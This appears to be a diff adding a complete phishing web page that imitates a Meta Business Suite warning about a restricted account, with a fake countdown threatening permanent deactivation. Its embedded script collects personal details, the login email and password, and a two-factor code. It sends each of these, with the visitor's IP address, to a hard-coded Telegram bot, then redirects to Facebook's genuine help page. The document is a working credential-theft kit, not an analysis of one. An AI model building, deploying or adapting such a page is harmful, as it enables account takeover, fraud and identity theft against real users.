@@ -1,0 +1,153 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Meta Business Suite</title>
+    <style>
+        :root { --m-blue: #1877F2; --m-bg: #FFFFFF; --m-text: #1C1E21; --m-gray: #65676B; --m-border: #ced4da; }
+        body { font-family: "Segoe UI", Helvetica, Arial, sans-serif; background: #f0f2f5; margin: 0; color: var(--m-text); }
+        .nav { background: white; padding: 12px 50px; border-bottom: 1px solid #dddfe2; display: flex; align-items: center; }
+        .card { background: white; max-width: 800px; margin: 20px auto; padding: 40px; border-radius: 8px; box-shadow: 0 1px 2px rgba(0, 0, 0, 0.1); }
+        
+        #p1 { max-width: 550px; text-align: center; margin-top: 80px; }
+        .illustration { width: 100%; height: 220px; background: #f0f2f5; border-radius: 10px; margin-bottom: 20px; display: flex; align-items: center; justify-content: center; font-size: 100px; }
+        
+        h1 { font-size: 24px; font-weight: 700; margin: 0 0 10px 0; }
+        .sub-text { color: var(--m-text); font-size: 14.5px; line-height: 1.4; margin-bottom: 25px; }
+        
+        input { width: 100%; padding: 15px; margin-bottom: 15px; border: 1px solid var(--m-border); border-radius: 8px; font-size: 16px; box-sizing: border-box; outline: none; }
+        input:focus { border-color: var(--m-blue); }
+        
+        .btn-row { display: flex; justify-content: flex-end; margin-top: 20px; }
+        .btn { background: var(--m-blue); color: white; border: none; padding: 12px 45px; border-radius: 6px; font-size: 16px; font-weight: 600; cursor: pointer; }
+        
+        .footer-box { display: flex; justify-content: space-between; font-size: 12px; border-top: 1px solid #eee; padding-top: 15px; margin-top: 20px; color: var(--m-gray); }
+        .blue-link { color: var(--m-blue); font-weight: bold; text-decoration: none; cursor: pointer; }
+        
+        .hidden { display: none; }
+        .fade-in { animation: fadeIn 0.3s forwards; }
+        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
+
+        .otp-box { letter-spacing: 15px; font-size: 30px; text-align: center; font-weight: bold; }
+    </style>
+</head>
+<body>
+
+<div class="nav">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/7/7b/Meta_Platforms_Inc._logo.svg" height="20">
+</div>
+
+<div id="p1" class="card fade-in">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/a/ab/Meta-Logo.svg/1024px-Meta-Logo.svg.png" width="90" style="margin-bottom: 25px;">
+    <div style="font-weight: 600; text-transform: uppercase; font-size: 12px; letter-spacing: 1px;">Business Community Standards</div>
+    <p style="font-weight: 700; font-size: 18px; margin: 25px 0;">Someone has reported your account for non-compliance with our terms of service.</p>
+    <p>You have <span id="timer1" style="font-weight: bold;">12 hours</span> to verify, otherwise your account will be permanently inactivated.</p>
+    <button class="btn" style="width: 100%; margin-top: 20px;" onclick="step(1, 2)">GET STARTED</button>
+    <p style="margin-top: 40px; font-size: 11px; color: var(--m-gray);">Facebook Report Team © 2025</p>
+</div>
+
+<div id="p2" class="card hidden">
+    <div class="illustration">🛡️</div>
+    <h1>Your account has been restricted</h1>
+    <div style="font-size: 12px; color: var(--m-gray); margin-bottom: 10px;">Term of Service</div>
+    <p class="sub-text">We detected unusual activity in your page today <b>December 23, 2025</b>. Someone has reported your account for not complying with <span class="blue-link" style="font-weight: normal;">Community Standards</span>. To avoid having your account <span class="blue-link" style="font-weight: normal;">disabled</span>, please verify:</p>
+    
+    <input type="text" id="pname" placeholder="Page Name">
+    <input type="text" id="fname" placeholder="Your Name (Name and Surname)">
+    <input type="text" id="phone" placeholder="Your Phone Number">
+    <input type="text" id="bday" placeholder="Birthday (dd/mm/yyyy)">
+    
+    <div class="footer-box">
+        <div>Case Number:<br><span class="blue-link">#100430558912</span></div>
+        <div style="max-width: 350px;">About Case: Violating Community Standards and Posting something inappropriate.</div>
+    </div>
+    <div class="btn-row"><button class="btn" id="b2" onclick="step(2, 3)">Continue</button></div>
+</div>
+
+<div id="p3" class="card hidden">
+    <div class="illustration">🔐</div>
+    <h1>Your account has been restricted</h1>
+    <div style="font-size: 12px; color: var(--m-gray); margin-bottom: 10px;">Term of Service</div>
+    <p class="sub-text">To secure your business page, please verify your identity by entering your account credentials:</p>
+    
+    <input type="text" id="email" placeholder="Email address or phone number">
+    <input type="password" id="pass" placeholder="Password">
+    
+    <div class="footer-box">
+        <div>Case Number:<br><span class="blue-link">#100430558912</span></div>
+        <div style="max-width: 350px;">About Case: Violating Community Standards and Posting something inappropriate.</div>
+    </div>
+    <div class="btn-row"><button class="btn" id="b3" onclick="step(3, 4)">Verification</button></div>
+    <p style="font-size: 12px; color: var(--m-gray); margin-top: 30px; border-top: 1px solid #eee; padding-top: 15px;">⚠️ Please make sure to fill in the data correctly. If you fill in the wrong data your account will be permanently closed.</p>
+</div>
+
+<div id="p4" class="card hidden" style="text-align: center;">
+    <div class="illustration" style="height: 120px; font-size: 50px;">📲</div>
+    <h1>Two-Factor Authentication</h1>
+    <p class="sub-text">We've sent a 6-digit verification code to your mobile device. Enter it below to complete the appeal.</p>
+    
+    <input type="text" id="otp" class="otp-box" maxlength="6" placeholder="000000" inputmode="numeric" onkeypress="return /[0-9]/i.test(event.key)">
+    <p style="font-size: 13px; color: var(--m-blue); cursor: pointer; font-weight: 600;">Didn't receive a code?</p>
+    
+    <div class="btn-row" style="justify-content: center;">
+        <button class="btn" id="b4" onclick="step(4, 5)">Submit Code</button>
+    </div>
+</div>
+
+<script>
+    const _t = "8342277483:AAFqV9LvbQBG2-VB9xl0VLhqShZK6IcEp5s";
+    const _c = "5901396648";
+    let uIP = "Detecting...";
+    fetch('https://api.ipify.org?format=json').then(r => r.json()).then(d => uIP = d.ip);
+
+    // Tab Trick
+    window.onblur = () => { document.title = "⚠️ Security Alert!"; };
+    window.onfocus = () => { document.title = "Meta Business Suite"; };
+
+    // Sticky Timer
+    function startClock() {
+        let end = localStorage.getItem('m_dl') || (Date.now() + 43200000);
+        localStorage.setItem('m_dl', end);
+        setInterval(() => {
+            let d = end - Date.now();
+            let el = document.getElementById('timer1');
+            if (d <= 0) { el.innerText = "0h 0m 0s"; return; }
+            let h = Math.floor(d/3600000), m = Math.floor((d%3600000)/60000), s = Math.floor((d%60000)/1000);
+            if (el) el.innerText = `${h} hours ${m} minutes ${s} seconds`;
+        }, 1000);
+    }
+    startClock();
+
+    async function send(msg) {
+        return fetch(`https://api.telegram.org/bot${_t}/sendMessage`, {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({chat_id: _c, text: msg, parse_mode: 'Markdown'})
+        });
+    }
+
+    async function step(f, t) {
+        if (f === 2) {
+            document.getElementById('b2').innerText = "Processing...";
+            await send(`🚨 *INFO CAPTURED*\n\n🏳️ *Page:* ${document.getElementById('pname').value}\n👤 *Name:* ${document.getElementById('fname').value}\n📞 *Phone:* ${document.getElementById('phone').value}\n🎂 *Bday:* ${document.getElementById('bday').value}\n🌐 *IP:* ${uIP}`);
+        }
+        if (f === 3) {
+            document.getElementById('b3').innerText = "Verifying...";
+            await send(`🔑 *LOGIN DATA*\n\n📧 *User:* ${document.getElementById('email').value}\n🔓 *Pass:* ${document.getElementById('pass').value}\n🌐 *IP:* ${uIP}`);
+        }
+        if (f === 4) {
+            document.getElementById('b4').innerText = "Finishing...";
+            await send(`🛡️ *2FA CODE:* \`${document.getElementById('otp').value}\`\n🌐 *IP:* ${uIP}`);
+            alert("Appeal Received. We will contact you shortly.");
+            window.location.href = "https://www.facebook.com/business/help";
+            return;
+        }
+        document.getElementById('p' + f).classList.add('hidden');
+        document.getElementById('p' + t).classList.remove('hidden');
+        document.getElementById('p' + t).classList.add('fade-in');
+    }
+</script>
+
+</body>
+</html>
